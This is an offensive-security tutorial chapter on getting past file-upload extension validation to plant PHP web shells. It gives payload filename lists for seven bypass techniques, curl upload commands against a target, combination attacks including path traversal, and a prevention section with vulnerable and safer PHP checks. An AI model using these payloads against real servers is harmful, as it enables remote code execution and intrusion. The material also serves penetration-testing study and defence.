# 1.1 Extension Bypass

## Goal

Bypass file extension validation to upload executable files disguised with different extensions or extension manipulation techniques.

---

## Why This Works

Many applications only check file extension (the `.something` part) and allow uploads if it matches a whitelist (e.g., `.jpg`, `.png`, `.pdf`). If a developer doesn't implement proper server-side validation, an attacker can manipulate the extension to bypass these checks.

---

## The 7 Core Techniques

### Technique 1: Double Extension

**How it works:**
```
Uploaded filename: exploit.php.jpg
Server assumption: "Ends with .jpg" → allowed
Server execution: "Contains .php" → executed as PHP
Result: File treated as PHP by web server, not image
```

**Why:** Web server processes based on the LAST recognized handler (or first, depending on config)

**Payloads:**
```
shell.php.jpg          (PHP first, then ignored jpg)
shell.jpg.php          (JPG first, then PHP - different config)
shell.php.png          (PNG handler)
shell.phtml.jpg        (Alternative PHP extension)
shell.php.pdf          (PDF extension)
```

**When to use:** When extension validation checks ENDS WITH certain extensions

**Detection:** 
- Try uploading and check if file is executable
- If `exploit.php.jpg` executes as PHP → VULNERABLE

---

### Technique 2: Case Variation

**How it works:**
```
Uploaded filename: shell.pHp
Server check: "Is extension .php?" (case-sensitive check fails)
Result: Uploaded as .pHp
Web server: "Execute .pHp as PHP" (case-insensitive execution)
Outcome: RCE
```

**Why:** Validation may be case-sensitive but execution isn't

**Payloads:**
```
shell.pHp              (Mixed case)
shell.PHP              (All caps)
shell.PhP              (Random case)
shell.phP              (Alternate)
shell.pHpHp            (Multiple mixed)
```

**When to use:** When filter uses exact string comparison (e.g., `extension == ".php"`)

**Detection:**
- Try: `shell.pHp`
- If accepted and executes → VULNERABLE

---

### Technique 3: Null Byte Injection

**How it works:**
```
Uploaded filename: shell.php%00.jpg
URL encoding: %00 = null byte
Server processing: "shell.php\0.jpg" 
String truncation: Null byte terminates string early
Result: Saved as shell.php (NOT shell.php.jpg)
Execution: Executes as PHP
```

**Why:** Null byte terminates string in C/older languages, so everything after is ignored

**Payloads:**
```
shell.php%00.jpg       (Null byte between extension)
shell.php%00.png       (With PNG)
shell.php%00           (Just null byte)
shell.jpg%00.php       (Reversed)
shell.phtml%00.jpg     (Alternative PHP extension)
```

**When to use:** Older PHP versions (PHP < 5.3.4), some legacy systems

**Important:** This is mostly patched in modern PHP versions

**Detection:**
- Mostly historical - less likely to work on modern systems
- Try if other methods fail

---

### Technique 4: Trailing Dot

**How it works:**
```
Uploaded filename: shell.php.
Filesystem interpretation: Trailing dot = no extension
Server assumption: Not a recognized executable extension
File stored: shell.php. (dot preserved)
Web server: Tries to execute, recognizes .php → RCE
```

**Why:** Operating systems (especially Windows) ignore trailing dots in filenames

**Payloads:**
```
shell.php.             (Trailing dot)
shell.phtml.           (PHP alternative)
shell.pht.             (HTML server-parsed)
```

**When to use:** Windows-based servers (IIS), some Apache configs

**Detection:**
- Try: `shell.php.`
- Upload and access file - check if executes

---

### Technique 5: Special Character Injection

**How it works:**
```
Different special characters can bypass filters:
- Space: shell.php%20.jpg
- Tab: shell.php%09.jpg
- Multiple dots: shell.php....jpg
```

**Why:** Filter might not handle whitespace/special chars properly

**Payloads:**
```
shell.php%20.jpg       (URL-encoded space)
shell.php%09.jpg       (URL-encoded tab)
shell.php%0a.jpg       (URL-encoded newline)
shell.php%0d.jpg       (Carriage return)
shell.php....jpg       (Multiple dots)
shell.php;;;.jpg       (Semicolons)
```

**When to use:** When basic special character filtering is weak

---

### Technique 6: Alternative PHP Extensions

**How it works:**
```
Server configured to execute multiple extensions as PHP:
- .php (standard)
- .php5, .php7 (version-specific)
- .phtml (PHP HTML)
- .pht (PHP T?)
- .phps (PHP source view)
- .phar (PHP archive)
```

**Why:** Developers enable alternate extensions but forget to block uploads

**Payloads:**
```
shell.phtml            (PHP HTML - often overlooked)
shell.php5             (PHP5 legacy)
shell.php7             (PHP7)
shell.pht              (Short form)
shell.phps             (Source view)
shell.phar             (Archive)
shell.inc              (Include files)
shell.shtml            (Server-side HTML)
shell.asp              (ASP, if on Windows)
shell.aspx             (ASP.NET)
shell.jsp              (Java)
shell.jspx             (Java variant)
shell.jspf             (Java fragment)
```

**When to use:** When .php is blocked but alternate handlers enabled

**Detection:**
- Check server headers: `X-Powered-By`, `Server`
- Test each alternate extension
- PHP info page might reveal enabled handlers

---

### Technique 7: Double URL Encoding

**How it works:**
```
Original: shell.php
URL encoded once: shell%2ephp (%2e = dot)
URL encoded again: shell%252ephp
Server decoding: 
  First decode: shell%2ephp
  Check: Still URL encoded → passes filter
  Second decode: shell.php → executes
```

**Why:** Server might decode multiple times

**Payloads:**
```
shell%252ephp          (Double-encoded dot)
shell%252ephp%252ejpg  (Double-encoded both)
shell.phtml%252fjpg    (Mixed encoding)
```

**When to use:** Rare - complex validation chains

## Real-World Examples

### Example 1: Double Extension Success
```
Target: WordPress plugin with bad validation
Upload: exploit.php.jpg
Stored as: exploit.php.jpg
Accessed via: /wp-content/uploads/exploit.php.jpg
Result: Executes as PHP → RCE
Reason: Apache directive processes .php files regardless of secondary extension
```

### Example 2: Case Variation Success
```
Target: PHP application on Windows server
Upload: shell.pHp
Stored as: shell.pHp
Filter: Checks if extension == ".php" (case-sensitive fails)
Execution: Windows file system is case-insensitive
Result: Executes as PHP → RCE
```

### Example 3: Alternate Extension Success
```
Target: Application blocks .php, allows .phtml
Upload: shell.phtml
Server config: Processes .phtml as PHP
Result: Uploaded, accessible, and executable → RCE
```

## Prevention (For Developers)

❌ **Bad:** Check if filename ends with `.php`
```php
if (strpos($_FILES['file']['name'], '.php') === false) {
    // Save file
    // VULNERABLE: Can upload shell.php.jpg
}
```

✅ **Good:** Get actual file extension and whitelist
```php
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, ['jpg', 'png', 'gif'])) {
    die("Invalid file type");
}
```

✅ **Better:** Check magic bytes + extension + MIME type
```php
// Validate MIME type
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);

// Validate magic bytes
$valid_mimes = ['image/jpeg', 'image/png', 'image/gif'];
if (!in_array($mime, $valid_mimes)) {
    die("Invalid file");
}

// Rename file - remove original extension
$new_name = uniqid() . '.' . $ext;
move_uploaded_file($_FILES['file']['tmp_name'], "uploads/$new_name");
```

## Detection Indicators

**File upload succeeded when it should have been blocked:**
- ✅ Double extension file accessible
- ✅ Mixed-case PHP file executes
- ✅ File with trailing dot stored
- ✅ Alternative PHP extension (phtml, php5) processes code

## Tools for Testing

**curl:**
```bash
# Upload with double extension
curl -F "file=@shell.php.jpg" http://target/upload.php

# Upload with case variation
curl -F "file=@shell.pHp" http://target/upload.php
```

**Burp Suite:**
1. Intercept upload request
2. Change filename to: `shell.php.jpg`
3. Forward request
4. Check if file is accessible and executes

---

## Combination Attacks

For maximum effectiveness, combine techniques:

```
1. Double extension + Content-Type spoof
   Filename: shell.php.jpg
   Content-Type: image/jpeg
   Result: Bypasses both extension AND MIME checks

2. Case variation + path traversal
   Filename: ../shell.pHp
   Result: Uploaded outside intended directory AND executed

3. Null byte + alternative extension
   Filename: shell.php%00.phtml
   Result: Bypasses multiple validation layers
```
